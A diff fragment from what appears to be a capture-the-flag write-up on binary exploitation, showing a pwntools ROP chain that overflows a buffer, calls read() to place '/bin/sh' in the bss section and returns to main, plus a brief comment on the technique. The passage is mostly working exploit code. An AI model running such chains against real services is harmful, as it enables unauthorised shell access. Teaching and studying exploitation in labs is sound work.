@@ -58,19 +58,22 @@ padding = 'a' * 216
 
 write_bin_sh = flat([
 
-  padding,
-  ret,
-  pop_rdi,
-  0x0,
-  pop_rsi_r15,
-  bss_addr,
-  0xdeadbeef,
-  exe.sym['read'],
-  exe.sym['main']
+	padding,
+	ret,
+	pop_rdi,
+	0x0,
+	pop_rsi_r15,
+	bss_addr,
+	0xdeadbeef,
+	exe.sym['read'],
+	exe.sym['main']
 
 ])
 
-exploit = padding + ret + write_bin_sh
+io.recvline()
+io.recvline()
+
+io.sendline(write_bin_sh)
 io.sendline('/bin/sh\x00')
 ```
 This rop chain will write "/bin/sh" to bss_addr and return to main once again nothing special here, Just some basic ROP technique :)
